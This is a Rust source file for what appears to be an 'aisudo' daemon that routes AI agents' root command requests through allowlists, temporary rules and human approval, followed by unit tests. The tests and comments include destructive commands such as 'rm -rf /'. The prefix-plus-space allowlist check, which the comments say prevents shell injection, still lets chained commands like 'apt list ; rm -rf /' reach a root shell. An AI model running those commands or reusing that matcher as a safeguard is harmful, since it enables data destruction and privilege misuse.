use aisudo_common::{
    ActiveTempRule, Decision, ExecOutput, ListRulesRequest, ListRulesResponse, RequestMode,
    SocketMessage, SudoRequest, SudoRequestRecord, SudoResponse, TempRuleRequest, TempRuleResponse,
};
use anyhow::Result;
use base64::Engine as _;
use std::path::Path;
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::UnixListener;
use tracing::{error, info, warn};

use crate::config::ConfigHolder;
use crate::db::Database;
use crate::notification::{NotificationBackend, TempRuleRecord};
use crate::sudoers::SudoersCache;

pub async fn run_socket_listener(
    config_holder: Arc<ConfigHolder>,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
) -> Result<()> {
    let socket_path = config_holder.config().socket_path.clone();
    let sudoers_cache = Arc::new(SudoersCache::new(300));

    // Ensure parent directory exists
    if let Some(parent) = socket_path.parent() {
        std::fs::create_dir_all(parent)?;
    }

    // Remove stale socket file
    if socket_path.exists() {
        std::fs::remove_file(&socket_path)?;
    }

    let listener = UnixListener::bind(&socket_path)?;

    // Make socket accessible (the daemon runs as root)
    set_socket_permissions(&socket_path)?;

    info!("Listening on Unix socket: {}", socket_path.display());

    loop {
        match listener.accept().await {
            Ok((stream, _addr)) => {
                let db = Arc::clone(&db);
                let backend = Arc::clone(&backend);
                let sudoers = Arc::clone(&sudoers_cache);
                let config = config_holder.config();
                let timeout = config.timeout_seconds;
                let allowlist = config.allowlist.clone();
                let max_stdin_bytes = config.limits.max_stdin_bytes;
                let max_temp_rule_duration = config.limits.max_temp_rule_duration_seconds;

                tokio::spawn(async move {
                    if let Err(e) =
                        handle_connection(stream, db, backend, sudoers, timeout, &allowlist, max_stdin_bytes, max_temp_rule_duration).await
                    {
                        error!("Connection handler error: {e:#}");
                    }
                });
            }
            Err(e) => {
                error!("Failed to accept connection: {e}");
            }
        }
    }
}

/// Resolve a UID to a username via the system passwd database.
fn resolve_username(uid: u32) -> Option<String> {
    nix::unistd::User::from_uid(nix::unistd::Uid::from_raw(uid))
        .ok()
        .flatten()
        .map(|u| u.name)
}

async fn handle_connection(
    stream: tokio::net::UnixStream,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
    sudoers: Arc<SudoersCache>,
    timeout_seconds: u32,
    allowlist: &[String],
    max_stdin_bytes: usize,
    max_temp_rule_duration: u32,
) -> Result<()> {
    // Extract the real UID of the connecting process via SO_PEERCRED.
    // This cannot be spoofed by the client (kernel-provided).
    let peer_uid = stream
        .peer_cred()
        .ok()
        .map(|cred| cred.uid());

    let (reader, mut writer) = stream.into_split();
    let mut buf_reader = BufReader::new(reader);
    let mut line = String::new();
    buf_reader.read_line(&mut line).await?;
    let line = line.trim().to_string();

    // Try SocketMessage envelope first, fall back to bare SudoRequest
    let result = if let Ok(msg) = serde_json::from_str::<SocketMessage>(&line) {
        match msg {
            SocketMessage::SudoRequest(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_sudo_request(request, &mut writer, db, backend, sudoers, timeout_seconds, allowlist, max_stdin_bytes).await
            }
            SocketMessage::TempRuleRequest(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_temp_rule_request(request, &mut writer, db, backend, max_temp_rule_duration).await
            }
            SocketMessage::ListRules(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_list_rules(request, &mut writer, db, sudoers, allowlist).await
            }
        }
    } else {
        // Backward compat: try bare SudoRequest
        match serde_json::from_str::<SudoRequest>(&line) {
            Ok(mut request) => {
                override_user_from_peer(&mut request.user, peer_uid);
                handle_sudo_request(request, &mut writer, db, backend, sudoers, timeout_seconds, allowlist, max_stdin_bytes).await
            }
            Err(_e) => Err(anyhow::anyhow!("invalid request")),
        }
    };

    if let Err(ref e) = result {
        error!("Request handling error: {e:#}");
        let response = SudoResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some("request failed".to_string()),
        };
        if let Ok(resp_json) = serde_json::to_string(&response) {
            let _ = writer.write_all(resp_json.as_bytes()).await;
            let _ = writer.write_all(b"\n").await;
        }
    }
    result
}

/// Override the user field with the real username from peer credentials.
/// If peer credentials are available, the client-supplied value is replaced;
/// if the UID cannot be resolved, we use the numeric UID as a string.
/// This prevents identity spoofing via $USER environment variable.
fn override_user_from_peer(user: &mut String, peer_uid: Option<u32>) {
    if let Some(uid) = peer_uid {
        let real_user = resolve_username(uid)
            .unwrap_or_else(|| format!("uid:{uid}"));
        if *user != real_user {
            warn!(
                "Peer credential mismatch: client claimed user='{}', actual uid={} ('{}')",
                user, uid, real_user
            );
        }
        *user = real_user;
    }
}

async fn handle_sudo_request(
    request: SudoRequest,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
    sudoers: Arc<SudoersCache>,
    timeout_seconds: u32,
    allowlist: &[String],
    max_stdin_bytes: usize,
) -> Result<()> {
    let mode = request.mode;
    info!(
        "Received sudo request: user={} command={} mode={:?}",
        request.user, request.command, mode
    );

    // Decode stdin if present
    let stdin_bytes = if let Some(ref stdin_b64) = request.stdin {
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(stdin_b64)
            .map_err(|_| anyhow::anyhow!("invalid stdin encoding"))?;
        if decoded.len() > max_stdin_bytes {
            warn!(
                "stdin too large: {} bytes (max {})",
                decoded.len(),
                max_stdin_bytes
            );
            let response = SudoResponse {
                request_id: String::new(),
                decision: Decision::Denied,
                error: Some(format!(
                    "stdin exceeds size limit ({} bytes, max {})",
                    decoded.len(),
                    max_stdin_bytes
                )),
            };
            let resp_json = serde_json::to_string(&response)?;
            writer.write_all(resp_json.as_bytes()).await?;
            writer.write_all(b"\n").await?;
            writer.flush().await?;
            return Ok(());
        }
        info!("Request includes stdin: {} bytes", decoded.len());
        Some(decoded)
    } else {
        None
    };

    // Check allowlist first - auto-approved commands skip rate limiting
    let command = request.command.clone();
    let cwd = request.cwd.clone();
    if is_allowed(&command, allowlist) {
        info!("Command auto-approved via allowlist: {}", command);
        let record = SudoRequestRecord::new(request, timeout_seconds);
        db.insert_request(&record)?;
        db.update_decision(&record.id, Decision::Approved, "allowlist")?;
        let response = SudoResponse {
            request_id: record.id,
            decision: Decision::Approved,
            error: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;

        if mode == RequestMode::Exec {
            exec_command(&command, &cwd, stdin_bytes, writer).await?;
        }
        return Ok(());
    }

    // Check active temp rules - auto-approved commands skip rate limiting
    if is_temp_rule_allowed(&db, &request.user, &command)? {
        info!("Command auto-approved via temp rule: {}", command);
        let record = SudoRequestRecord::new(request, timeout_seconds);
        db.insert_request(&record)?;
        db.update_decision(&record.id, Decision::Approved, "temp_rule")?;
        let response = SudoResponse {
            request_id: record.id,
            decision: Decision::Approved,
            error: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;

        if mode == RequestMode::Exec {
            exec_command(&command, &cwd, stdin_bytes, writer).await?;
        }
        return Ok(());
    }

    // Check NOPASSWD rules (unless skip_nopasswd is set, i.e. retry after sudo -n failed)
    if !request.skip_nopasswd {
        let user = request.user.clone();
        let cmd = command.clone();
        let sudoers_ref = Arc::clone(&sudoers);
        let is_nopasswd = tokio::task::spawn_blocking(move || {
            sudoers_ref.is_nopasswd_allowed(&user, &cmd)
        })
        .await?;

        if is_nopasswd {
            info!("Command matches NOPASSWD rule, telling CLI to use sudo: {}", command);
            let record = SudoRequestRecord::new(request, timeout_seconds);
            db.insert_request(&record)?;
            db.update_decision(&record.id, Decision::UseSudo, "nopasswd")?;
            let response = SudoResponse {
                request_id: record.id,
                decision: Decision::UseSudo,
                error: None,
            };
            let resp_json = serde_json::to_string(&response)?;
            writer.write_all(resp_json.as_bytes()).await?;
            writer.write_all(b"\n").await?;
            writer.flush().await?;
            return Ok(());
        }
    }

    // Rate limiting: max 30 non-allowlisted requests per minute per user
    if !db.check_rate_limit(&request.user, 30)? {
        warn!("Rate limit exceeded for user: {}", request.user);
        let response = SudoResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some("rate limit exceeded".to_string()),
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
        return Ok(());
    }

    // Create request record
    let record = SudoRequestRecord::new(request, timeout_seconds);
    db.insert_request(&record)?;

    // Send notification and wait for response
    let (decision, error_msg) = match backend.send_and_wait(&record).await {
        Ok(d) => (d, None),
        Err(e) => {
            error!("Notification backend error for request {}: {e:#}", record.id);
            (Decision::Denied, Some("notification error".to_string()))
        }
    };

    // Update database
    db.update_decision(&record.id, decision, backend.name())?;

    // Send response
    let response = SudoResponse {
        request_id: record.id,
        decision,
        error: error_msg,
    };
    let resp_json = serde_json::to_string(&response)?;
    writer.write_all(resp_json.as_bytes()).await?;
    writer.write_all(b"\n").await?;

    // If exec mode and approved, execute the command and stream output
    if mode == RequestMode::Exec && decision == Decision::Approved {
        exec_command(&command, &cwd, stdin_bytes, writer).await?;
    }

    Ok(())
}

fn is_temp_rule_allowed(db: &Database, user: &str, command: &str) -> Result<bool> {
    let rules = db.get_active_temp_rules(user)?;
    for patterns_json in &rules {
        let patterns: Vec<String> = serde_json::from_str(patterns_json)?;
        for pattern in &patterns {
            if command == pattern.as_str() {
                return Ok(true);
            }
            // Allow the command if it starts with the pattern followed by a space.
            // This prevents shell injection via metacharacters appended to the prefix.
            if command.starts_with(pattern.as_str())
                && command.as_bytes().get(pattern.len()) == Some(&b' ')
            {
                return Ok(true);
            }
        }
    }
    Ok(false)
}

async fn handle_temp_rule_request(
    request: TempRuleRequest,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
    db: Arc<Database>,
    backend: Arc<dyn NotificationBackend>,
    max_temp_rule_duration: u32,
) -> Result<()> {
    info!(
        "Received temp rule request: user={} patterns={:?} duration={}s",
        request.user, request.patterns, request.duration_seconds
    );

    // Validate duration
    if request.duration_seconds > max_temp_rule_duration {
        let response = TempRuleResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some(format!(
                "duration {}s exceeds maximum {}s",
                request.duration_seconds, max_temp_rule_duration
            )),
            expires_at: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
        return Ok(());
    }

    if request.patterns.is_empty() {
        let response = TempRuleResponse {
            request_id: String::new(),
            decision: Decision::Denied,
            error: Some("no patterns provided".to_string()),
            expires_at: None,
        };
        let resp_json = serde_json::to_string(&response)?;
        writer.write_all(resp_json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
        return Ok(());
    }

    let id = uuid::Uuid::new_v4().to_string();
    let nonce = uuid::Uuid::new_v4().to_string();
    let now = chrono::Utc::now();
    let requested_at = now.to_rfc3339();
    let expires_at = (now + chrono::Duration::seconds(request.duration_seconds as i64)).to_rfc3339();
    let patterns_json = serde_json::to_string(&request.patterns)?;

    db.insert_temp_rule(
        &id,
        &request.user,
        &patterns_json,
        request.duration_seconds,
        &requested_at,
        &expires_at,
        &nonce,
        request.reason.as_deref(),
    )?;

    let record = TempRuleRecord {
        id: id.clone(),
        user: request.user.clone(),
        patterns: request.patterns.clone(),
        duration_seconds: request.duration_seconds,
        expires_at: expires_at.clone(),
        nonce: nonce.clone(),
        reason: request.reason.clone(),
    };

    let (decision, error_msg) = match backend.send_temp_rule_and_wait(&record).await {
        Ok(d) => (d, None),
        Err(e) => {
            error!("Notification backend error for temp rule {id}: {e:#}");
            (Decision::Denied, Some("notification error".to_string()))
        }
    };

    db.update_temp_rule_decision(&id, decision, backend.name())?;

    let response = TempRuleResponse {
        request_id: id,
        decision,
        error: error_msg,
        expires_at: if decision == Decision::Approved {
            Some(expires_at)
        } else {
            None
        },
    };
    let resp_json = serde_json::to_string(&response)?;
    writer.write_all(resp_json.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    Ok(())
}

async fn handle_list_rules(
    request: ListRulesRequest,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
    db: Arc<Database>,
    sudoers: Arc<SudoersCache>,
    allowlist: &[String],
) -> Result<()> {
    info!("Received list-rules request for user={}", request.user);

    let user = request.user.clone();

    // Gather temp rules from DB
    let temp_rule_rows = db.get_active_temp_rules_detailed(&user)?;
    let temp_rules: Vec<ActiveTempRule> = temp_rule_rows
        .into_iter()
        .filter_map(|(patterns_json, expires_at)| {
            let patterns: Vec<String> = serde_json::from_str(&patterns_json).ok()?;
            Some(ActiveTempRule {
                patterns,
                expires_at,
            })
        })
        .collect();

    // Gather NOPASSWD rules via spawn_blocking
    let sudoers_ref = Arc::clone(&sudoers);
    let user_clone = user.clone();
    let nopasswd_rules = tokio::task::spawn_blocking(move || {
        sudoers_ref.get_nopasswd_rules(&user_clone)
    })
    .await?;

    let response = ListRulesResponse {
        allowlist: allowlist.to_vec(),
        temp_rules,
        nopasswd_rules,
    };

    let resp_json = serde_json::to_string(&response)?;
    writer.write_all(resp_json.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    Ok(())
}

/// Execute a command as root and stream stdout/stderr back over the socket.
async fn exec_command(
    command: &str,
    cwd: &str,
    stdin_bytes: Option<Vec<u8>>,
    writer: &mut tokio::net::unix::OwnedWriteHalf,
) -> Result<()> {
    use tokio::process::Command;

    info!("Executing command: {command}");

    let mut child = Command::new("sh")
        .arg("-c")
        .arg(command)
        .current_dir(cwd)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .stdin(if stdin_bytes.is_some() {
            std::process::Stdio::piped()
        } else {
            std::process::Stdio::null()
        })
        .spawn()?;

    // Write stdin to child process if present
    if let Some(data) = stdin_bytes {
        if let Some(mut stdin_pipe) = child.stdin.take() {
            tokio::spawn(async move {
                if let Err(e) = stdin_pipe.write_all(&data).await {
                    error!("Failed to write stdin to child: {e}");
                }
                // Dropping stdin_pipe closes the pipe, signaling EOF to the child
            });
        }
    }

    let stdout = child.stdout.take();
    let stderr = child.stderr.take();

    // Use a channel to collect output from both streams, then write serially.
    let (tx, mut rx) = tokio::sync::mpsc::channel::<ExecOutput>(64);

    if let Some(stdout) = stdout {
        let tx_out = tx.clone();
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut reader = BufReader::new(stdout);
            let mut buf = vec![0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        let data = String::from_utf8_lossy(&buf[..n]).to_string();
                        let _ = tx_out
                            .send(ExecOutput {
                                stream: "stdout".to_string(),
                                data,
                                exit_code: None,
                            })
                            .await;
                    }
                    Err(_) => break,
                }
            }
        });
    }

    if let Some(stderr) = stderr {
        let tx_err = tx.clone();
        tokio::spawn(async move {
            use tokio::io::AsyncReadExt;
            let mut reader = BufReader::new(stderr);
            let mut buf = vec![0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        let data = String::from_utf8_lossy(&buf[..n]).to_string();
                        let _ = tx_err
                            .send(ExecOutput {
                                stream: "stderr".to_string(),
                                data,
                                exit_code: None,
                            })
                            .await;
                    }
                    Err(_) => break,
                }
            }
        });
    }

    // Drop the last sender so rx completes when both streams are done
    drop(tx);

    // Forward all output to the socket
    while let Some(output) = rx.recv().await {
        let json = serde_json::to_string(&output)?;
        writer.write_all(json.as_bytes()).await?;
        writer.write_all(b"\n").await?;
        writer.flush().await?;
    }

    // Wait for exit code
    let status = child.wait().await?;
    let exit_code = status.code().unwrap_or(1);

    info!("Command finished with exit code: {exit_code}");

    let exit_msg = ExecOutput {
        stream: "exit".to_string(),
        data: String::new(),
        exit_code: Some(exit_code),
    };
    let json = serde_json::to_string(&exit_msg)?;
    writer.write_all(json.as_bytes()).await?;
    writer.write_all(b"\n").await?;
    writer.flush().await?;

    Ok(())
}

fn is_allowed(command: &str, allowlist: &[String]) -> bool {
    for pattern in allowlist {
        if command == pattern {
            return true;
        }
        // Allow the command if it starts with the pattern followed by a space
        // (i.e. the pattern matches the command name and the rest are arguments).
        // This prevents shell injection like "apt list; rm -rf /" matching "apt list".
        if command.starts_with(pattern) && command.as_bytes().get(pattern.len()) == Some(&b' ') {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    struct MockBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            panic!("send_and_wait should not be called when rate-limited");
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            panic!("send_temp_rule_and_wait should not be called");
        }
        fn name(&self) -> &'static str {
            "mock"
        }
    }

    #[tokio::test]
    async fn rate_limit_sends_denial_response() {
        let dir = std::env::temp_dir().join(format!(
            "aisudo-rate-limit-test-{}",
            std::process::id()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.join("test.db")).unwrap());

        // Use the real username (as resolved via SO_PEERCRED) for rate-limit records
        let user = real_test_user();

        // Insert 30 requests to exceed the rate limit
        for i in 0..30 {
            let req = SudoRequest {
                user: user.clone(),
                command: format!("cmd-{}", i),
                cwd: "/tmp".to_string(),
                pid: 1000 + i as u32,
                mode: RequestMode::Exec,
                reason: None,
                stdin: None,
                skip_nopasswd: false,
            };
            let record = SudoRequestRecord::new(req, 60);
            db.insert_request(&record).unwrap();
        }

        // Create a connected socket pair
        let (client, server) = tokio::net::UnixStream::pair().unwrap();
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);
        let db_clone = Arc::clone(&db);

        // Spawn the daemon handler
        let sudoers = Arc::new(SudoersCache::new(300));
        let handler = tokio::spawn(async move {
            handle_connection(server, db_clone, backend, sudoers, 60, &[], 10 * 1024 * 1024, 86400).await
        });

        // Client side: send a request that should be rate-limited
        let (reader, mut writer) = client.into_split();
        let request = SudoRequest {
            user: user.clone(),
            command: "should-be-rate-limited".to_string(),
            cwd: "/tmp".to_string(),
            pid: 9999,
            mode: RequestMode::Exec,
            reason: None,
            stdin: None,
            skip_nopasswd: false,
        };
        let json = serde_json::to_string(&request).unwrap();
        writer.write_all(json.as_bytes()).await.unwrap();
        writer.write_all(b"\n").await.unwrap();
        writer.flush().await.unwrap();

        // Client side: read response (with timeout to detect hangs)
        let mut buf_reader = BufReader::new(reader);
        let mut line = String::new();
        let read_result = tokio::time::timeout(
            std::time::Duration::from_secs(5),
            buf_reader.read_line(&mut line),
        )
        .await;
        let bytes_read = read_result
            .expect("client timed out waiting for response — daemon did not send one")
            .unwrap();
        assert!(
            bytes_read > 0,
            "daemon closed connection without sending a response"
        );

        let response: SudoResponse = serde_json::from_str(line.trim()).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(
            response
                .error
                .as_deref()
                .unwrap()
                .contains("rate limit"),
            "expected 'rate limit' in error, got: {:?}",
            response.error
        );

        // Daemon handler should have returned Ok
        handler.await.unwrap().unwrap();

        // Cleanup
        std::fs::remove_dir_all(&dir).ok();
    }

    struct MockApproveBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockApproveBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Approved)
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Approved)
        }
        fn name(&self) -> &'static str {
            "mock_approve"
        }
    }

    struct MockDenyBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockDenyBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Denied)
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            Ok(Decision::Denied)
        }
        fn name(&self) -> &'static str {
            "mock_deny"
        }
    }

    struct MockErrorBackend;

    #[async_trait::async_trait]
    impl crate::notification::NotificationBackend for MockErrorBackend {
        async fn send_and_wait(&self, _record: &SudoRequestRecord) -> anyhow::Result<Decision> {
            Err(anyhow::anyhow!("notification service down"))
        }
        async fn send_temp_rule_and_wait(&self, _record: &crate::notification::TempRuleRecord) -> anyhow::Result<Decision> {
            Err(anyhow::anyhow!("notification service down"))
        }
        fn name(&self) -> &'static str {
            "mock_error"
        }
    }

    /// Returns the username for the current process UID, matching what the daemon
    /// resolves via SO_PEERCRED when using `UnixStream::pair()`.
    fn real_test_user() -> String {
        resolve_username(nix::unistd::getuid().as_raw()).unwrap_or_else(|| "unknown".to_string())
    }

    /// Helper: send a JSON message through the socket handler and return the first response line.
    async fn send_and_receive(
        db: Arc<crate::db::Database>,
        backend: Arc<dyn crate::notification::NotificationBackend>,
        request_json: &str,
        allowlist: &[String],
        max_stdin_bytes: usize,
        max_temp_rule_duration: u32,
    ) -> String {
        let (client, server) = tokio::net::UnixStream::pair().unwrap();
        let sudoers = Arc::new(SudoersCache::new(0)); // 0 TTL so cache is always stale

        let db2 = Arc::clone(&db);
        let backend2 = Arc::clone(&backend);
        let allowlist = allowlist.to_vec();
        let handler = tokio::spawn(async move {
            handle_connection(server, db2, backend2, sudoers, 60, &allowlist, max_stdin_bytes, max_temp_rule_duration).await
        });

        let (reader, mut writer) = client.into_split();
        writer.write_all(request_json.as_bytes()).await.unwrap();
        writer.write_all(b"\n").await.unwrap();
        writer.flush().await.unwrap();
        drop(writer); // close write end so handler knows there's no more data

        let mut buf_reader = BufReader::new(reader);
        let mut line = String::new();
        tokio::time::timeout(
            std::time::Duration::from_secs(10),
            buf_reader.read_line(&mut line),
        )
        .await
        .expect("timed out waiting for response")
        .unwrap();

        let _ = handler.await;
        line.trim().to_string()
    }

    #[tokio::test]
    async fn allowlist_auto_approves_command() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "apt list --installed".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: false,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(
            db, backend, &json,
            &["apt list".to_string()], 10_000_000, 86400,
        ).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
    }

    #[tokio::test]
    async fn notification_approval_flow() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "rm -rf /important".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
    }

    #[tokio::test]
    async fn notification_denial_flow() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockDenyBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "rm -rf /".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
    }

    #[tokio::test]
    async fn notification_error_results_in_denial() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockErrorBackend);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "some-command".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: None,
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("notification"));
    }

    #[tokio::test]
    async fn stdin_too_large_is_denied() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        // Create a base64 payload that decodes to more than 100 bytes (our small limit)
        let large_data = vec![b'A'; 200];
        let b64 = base64::engine::general_purpose::STANDARD.encode(&large_data);

        let request = SudoRequest {
            user: "testuser".to_string(),
            command: "cat".to_string(),
            cwd: "/tmp".to_string(),
            pid: 1,
            mode: RequestMode::Pam,
            reason: None,
            stdin: Some(b64),
            skip_nopasswd: true,
        };
        let json = serde_json::to_string(&request).unwrap();

        // max_stdin_bytes = 100, so 200-byte stdin should be rejected
        let resp_line = send_and_receive(db, backend, &json, &[], 100, 86400).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("stdin exceeds size limit"));
    }

    #[tokio::test]
    async fn invalid_json_returns_error() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        let resp_line = send_and_receive(
            db, backend, "this is not json", &[], 10_000_000, 86400,
        ).await;

        let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.is_some());
    }

    #[tokio::test]
    async fn temp_rule_request_duration_exceeds_max() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
            user: "testuser".to_string(),
            patterns: vec!["apt install".to_string()],
            duration_seconds: 99999,
            reason: None,
        });
        let json = serde_json::to_string(&msg).unwrap();

        // max_temp_rule_duration = 3600
        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 3600).await;

        let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("exceeds maximum"));
    }

    #[tokio::test]
    async fn temp_rule_request_empty_patterns() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
            user: "testuser".to_string(),
            patterns: vec![],
            duration_seconds: 3600,
            reason: None,
        });
        let json = serde_json::to_string(&msg).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Denied);
        assert!(response.error.unwrap().contains("no patterns"));
    }

    #[tokio::test]
    async fn temp_rule_request_approved_flow() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);

        let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
            user: "testuser".to_string(),
            patterns: vec!["apt install".to_string(), "apt list".to_string()],
            duration_seconds: 3600,
            reason: Some("need to install deps".to_string()),
        });
        let json = serde_json::to_string(&msg).unwrap();

        let resp_line = send_and_receive(db, backend, &json, &[], 10_000_000, 86400).await;

        let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
        assert_eq!(response.decision, Decision::Approved);
        assert!(response.expires_at.is_some());
    }

    #[tokio::test]
    async fn list_rules_returns_allowlist_and_temp_rules() {
        let dir = tempfile::TempDir::new().unwrap();
        let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);

        // Use real username (daemon overrides via SO_PEERCRED)
        let user = real_test_user();

        // Add an active temp rule for the real user
        let now = chrono::Utc::now();
        let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
        let patterns = serde_json::to_string(&vec!["docker ps"]).unwrap();
        db.insert_temp_rule("r1", &user, &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();

        let msg = aisudo_common::SocketMessage::ListRules(aisudo_common::ListRulesRequest {
            user: user.clone(),
        });
        let json = serde_json::to_string(&msg).unwrap();

        let resp_line = send_and_receive(
            db, backend, &json,
            &["apt list".to_string()], 10_000_000, 86400,
        ).await;

